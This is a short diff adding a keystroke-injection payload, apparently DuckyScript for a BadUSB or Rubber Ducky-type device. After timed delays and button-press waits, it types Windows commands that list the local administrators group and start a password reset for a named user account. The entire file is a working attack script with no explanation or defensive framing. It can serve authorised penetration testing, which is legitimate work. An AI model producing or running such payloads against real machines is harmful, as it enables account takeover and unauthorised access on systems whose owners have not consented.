@@ -1,0 +1,8 @@
+DELAY 5000
+STRING net localgroup administrators
+WAIT_FOR_BUTTON_PRESS
+ENTER
+DELAY 5000
+STRING net user user_here *
+WAIT_FOR_BUTTON_PRESS
+ENTER
